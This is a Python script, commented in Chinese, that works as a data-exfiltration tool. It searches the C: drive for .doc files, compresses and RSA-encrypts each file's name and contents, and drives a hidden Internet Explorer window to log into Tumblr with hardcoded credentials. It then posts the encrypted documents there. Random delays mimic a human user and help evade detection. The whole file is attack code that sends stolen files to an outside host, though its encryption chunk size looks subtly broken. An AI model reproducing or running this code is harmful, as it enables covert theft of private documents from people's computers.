import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import logging
import sys

# 配置参数
DOC_TYPE = ".doc"  # 目标文件类型
USERNAME = "jms@bughunter.ca"  # Tumblr 账户邮箱
PASSWORD = "justinBHP2014"  # Tumblr 账户密码
LOG_FILE = "exfiltration.log"  # 日志文件

# RSA 公钥（需替换为有效的公钥）
PUBLIC_KEY = """
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCqGKukO1De7zhZj6+H0qtjTkVxwTCpvKe4eCZ0
FPqri0cb2JZfXJ/DgYSF6vUpwmJG8wVQZKjeGcjDOL5UlsuusFncCzWBQ7RKNUSesmQRMSGkVb1/
3j+skZ6UtW+5u09lHNsj6tQ51s1SPrCBkedbNf0Tp0GbMJDyR4e9T04ZZwIDAQAB
-----END PUBLIC KEY-----
"""

# 设置日志配置
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

def wait_for_browser(browser):
    """
    等待浏览器页面加载完成
    参数:
        browser: Internet Explorer COM 对象
    """
    try:
        while browser.ReadyState != 4 and browser.ReadyState != "complete":
            time.sleep(0.1)
    except Exception as e:
        logging.error(f"等待浏览器加载失败: {e}")
        raise

def encrypt_string(plaintext):
    """
    压缩并加密字符串（文件名或文件内容）
    参数:
        plaintext: 要加密的字符串或字节串
    返回:
        加密后的 Base64 编码字符串
    """
    try:
        # 确保输入为字节串
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        
        # 压缩数据
        print(f"压缩: {len(plaintext)} 字节")
        compressed = zlib.compress(plaintext)
        print(f"压缩后: {len(compressed)} 字节")
        
        # 初始化 RSA 加密
        rsakey = RSA.import_key(PUBLIC_KEY)
        cipher = PKCS1_OAEP.new(rsakey)
        
        # 分块加密（RSA 限制单次加密长度）
        chunk_size = 256  # PKCS1_OAEP 最大输入长度
        encrypted = b""
        offset = 0
        while offset < len(compressed):
            chunk = compressed[offset:offset + chunk_size]
            if len(chunk) < chunk_size:
                chunk = chunk + b" " * (chunk_size - len(chunk))  # 填充空格
            encrypted += cipher.encrypt(chunk)
            offset += chunk_size
        
        # Base64 编码
        encrypted_b64 = base64.b64encode(encrypted).decode('utf-8')
        print(f"Base64 编码后: {len(encrypted_b64)} 字节")
        return encrypted_b64
    
    except Exception as e:
        logging.error(f"加密失败: {e}")
        raise

def encrypt_post(filename):
    """
    加密文件内容和文件名
    参数:
        filename: 文件路径
    返回:
        encrypt_title: 加密后的文件名
        encrypt_body: 加密后的文件内容
    """
    try:
        with open(filename, "rb") as fd:
            contents = fd.read()
        
        encrypt_title = encrypt_string(filename)
        encrypt_body = encrypt_string(contents)
        return encrypt_title, encrypt_body
    
    except Exception as e:
        logging.error(f"加密文件 {filename} 失败: {e}")
        raise

def random_sleep(min_seconds=5, max_seconds=10):
    """
    随机睡眠，模拟人类行为
    参数:
        min_seconds: 最小睡眠时间
        max_seconds: 最大睡眠时间
    """
    sleep_time = random.randint(min_seconds, max_seconds)
    time.sleep(sleep_time)

def login_to_tumblr(ie):
    """
    登录 Tumblr 账户
    参数:
        ie: Internet Explorer COM 对象
    """
    try:
        # 填充登录表单
        full_doc = ie.Document.all
        for elem in full_doc:
            if elem.id == "signup_email":
                elem.setAttribute("value", USERNAME)
            elif elem.id == "signup_password":
                elem.setAttribute("value", PASSWORD)
        
        random_sleep()
        
        # 提交登录表单
        forms = ie.Document.forms
        for form in forms:
            if form.id == "signup_form":
                form.submit()
                break
        else:
            logging.warning("未找到 signup_form，尝试提交第一个表单")
            forms[0].submit()
        
        random_sleep()
        wait_for_browser(ie)
        logging.info("Tumblr 登录成功")
    
    except Exception as e:
        logging.error(f"Tumblr 登录失败: {e}")
        raise

def post_to_tumblr(ie, title, post):
    """
    在 Tumblr 上发布加密后的文件内容
    参数:
        ie: Internet Explorer COM 对象
        title: 加密后的文件名
        post: 加密后的文件内容
    """
    try:
        full_doc = ie.Document.all
        title_box = None
        post_form = None
        
        # 填充帖子标题和内容
        for elem in full_doc:
            if elem.id == "post_one":  # 修正为 Tumblr 的标题字段 ID
                elem.setAttribute("value", title)
                title_box = elem
                elem.focus()
            elif elem.id == "post_two":  # 修正为 Tumblr 的内容字段 ID
                elem.setAttribute("innerHTML", post)
                logging.info("已设置帖子内容")
                elem.focus()
            elif elem.id == "create_post":  # 发布按钮
                logging.info("找到发布按钮")
                post_form = elem
                elem.focus()
        
        if not title_box or not post_form:
            raise Exception("未找到标题或发布按钮")
        
        random_sleep()
        title_box.focus()
        random_sleep()
        
        # 点击发布按钮
        post_form.children[0].click()
        wait_for_browser(ie)
        random_sleep()
        logging.info("帖子发布成功")
    
    except Exception as e:
        logging.error(f"发布帖子失败: {e}")
        raise

def exfiltrate(document_path):
    """
    将指定文件加密并通过 Tumblr 渗漏
    参数:
        document_path: 文件路径
    """
    ie = None
    try:
        # 初始化 Internet Explorer
        ie = win32com.client.Dispatch("InternetExplorer.Application")
        ie.Visible = 0  # 隐藏浏览器窗口，增强隐蔽性（可设为 1 以调试）
        
        # 导航到 Tumblr 登录页面
        ie.Navigate("https://www.tumblr.com/login")
        wait_for_browser(ie)
        logging.info(f"导航到 Tumblr 登录页面")
        
        # 登录
        print("正在登录 Tumblr...")
        login_to_tumblr(ie)
        print("登录成功，导航到发布页面...")
        
        # 导航到新帖子页面
        ie.Navigate("https://www.tumblr.com/new/text")
        wait_for_browser(ie)
        
        # 加密并发布文件
        title, body = encrypt_post(document_path)
        print(f"正在发布文件: {document_path}")
        post_to_tumblr(ie, title, body)
        print(f"文件 {document_path} 发布成功！")
    
    except Exception as e:
        logging.error(f"渗漏文件 {document_path} 失败: {e}")
        print(f"[错误] 渗漏文件 {document_path} 失败: {e}")
    
    finally:
        # 清理浏览器资源
        if ie:
            try:
                ie.Quit()
            except:
                pass
        logging.info(f"完成文件 {document_path} 的处理")

def main():
    """
    主函数，扫描系统中的 .doc 文件并渗漏
    """
    try:
        # 扫描 C:\\ 下的 .doc 文件
        for parent, _, filenames in os.walk(r"C:\\"):
            for filename in fnmatch.filter(filenames, f"*{DOC_TYPE}"):
                document_path = os.path.join(parent, filename)
                print(f"发现文件: {document_path}")
                logging.info(f"发现文件: {document_path}")
                
                # 执行渗漏
                exfiltrate(document_path)
                
                # 等待用户确认（可注释掉以自动化）
                try:
                    input("继续？（按 Enter 继续，Ctrl+C 退出）")
                except KeyboardInterrupt:
                    print("\n程序退出")
                    sys.exit(0)
    
    except Exception as e:
        logging.error(f"主程序错误: {e}")
        print(f"[错误] 主程序错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()